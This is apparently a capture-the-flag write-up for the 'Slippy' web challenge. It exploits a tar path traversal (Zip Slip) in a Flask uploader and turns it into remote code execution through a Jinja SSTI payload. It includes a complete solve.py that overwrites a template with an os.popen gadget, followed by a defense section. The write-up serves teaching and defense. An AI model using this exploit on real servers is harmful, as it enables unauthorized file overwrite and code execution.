## Overview

Slippy is an Easy [Web](https://cwe.mitre.org/data/definitions/22.html) challenge built around a single, classic flaw: an "upload your firmware `.tar.gz`" feature that unpacks the archive with `tarfile.extractall()` and never checks where the members land. This is the [Zip Slip](https://cwe.mitre.org/data/definitions/22.html) pattern ([CVE-2007-4559](https://nvd.nist.gov/vuln/detail/CVE-2007-4559)) — a path-traversal that gives us an **arbitrary file write**. We turn that write into code execution by overwriting the app's Jinja template with a server-side template injection gadget, and let the server's own debug auto-reload do the rest.

## The technique

The extraction routine looks like this:

```python
def extract_from_archive(file):
    tmp  = tempfile.gettempdir()          # /tmp
    path = os.path.join(tmp, file.filename)
    file.save(path)
    if tarfile.is_tarfile(path):
        tar = tarfile.open(path, 'r:gz')
        tar.extractall(tmp)               # member names never validated -> Zip Slip
        ...
        for tarinfo in tar:
            if tarinfo.isreg():
                os.rename(os.path.join(tmp, name), f'{extractdir}/{name}')
```

`extractall(tmp)` computes each output path as `os.path.join('/tmp', member_name)`. The trick: an **absolute** member name always wins that join — `os.path.join('/tmp', '/app/application/templates/index.html')` evaluates to `/app/application/templates/index.html`, so the file is written straight onto the application source, escaping the temp directory entirely. (A relative `../` member gets clamped inside `/tmp` on this Python 3.10 container; the absolute form does not.)

The "obvious" idea — a symlink member pointing at `/app/flag` — does **not** work here: a symlink has `tarinfo.isreg() == False`, so the post-extract loop takes its `else` branch and treats the symlink name as a directory. It's never served, so it's a dead end.

With an arbitrary *write* (not a read), the cleanest path to the flag on a Flask app is to overwrite a file the server reads back to us. `run.py` runs with `debug=True`, which makes Flask auto-reload templates — so if we overwrite the Jinja `index.html` template with an SSTI payload, it renders on the very next `GET /`, with no app restart and a single upload.

## Solution

First, prove the write primitive by dropping a file into the served static directory and fetching it back. Then overwrite the index template with the SSTI gadget and read the flag off the next request.

Create `solve.py`:

```python
import io, sys, tarfile, time, requests
BASE = f"http://{sys.argv[1]}"

def upload(name, content):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        info = tarfile.TarInfo(name=name)          # absolute name kept verbatim -> traversal
        info.size = len(content)
        tar.addfile(info, io.BytesIO(content))
    return requests.post(f"{BASE}/api/unslippy",
        files={"file": ("x.tar.gz", buf.getvalue(), "application/gzip")}, timeout=20)

upload("/app/application/static/probe.txt", b"TRAVERSAL_OK\n")
print("probe:", requests.get(f"{BASE}/static/probe.txt", timeout=10).text.strip())

SSTI = b"{{ cycler.__init__.__globals__.os.popen('cat /app/flag').read() }}\n"
upload("/app/application/templates/index.html", SSTI)
time.sleep(2)
print(requests.get(f"{BASE}/", timeout=8).text.strip())
```

Run it against the instance:

```bash
python3 solve.py <target-host>:<port>
```

```
probe: TRAVERSAL_OK
HTB{...}
```

The overwrite upload returns HTTP 500 (the routine's later `os.rename` fails because the destination directory doesn't exist) — but that's irrelevant: `extractall` has already written the template by then, so the next `GET /` renders the gadget and prints the flag.

## Why it worked

`tarfile.extractall()` trusts member names completely. Joining an attacker-controlled **absolute** path onto the extraction base discards the base, so the write lands wherever the attacker chooses — here, on top of a live Jinja template. Combined with `debug=True` (which auto-reloads templates and turns any file write into a render-time code-execution sink), an innocent-looking firmware uploader becomes unauthenticated RCE.

## Fix / defense

- Validate every archive member before extraction: reject absolute paths and any `..` component, resolve the final path, and assert it stays under the target directory.
- On Python 3.12+, pass a filter: `tar.extractall(tmp, filter='data')` (this becomes the default in 3.14 and blocks both absolute and traversal members).
- Extract into a dedicated unprivileged sandbox, never into or near application source/templates.
- Never run Flask with `debug=True` in production — it turns a file write into reload-to-RCE and exposes the interactive debugger.
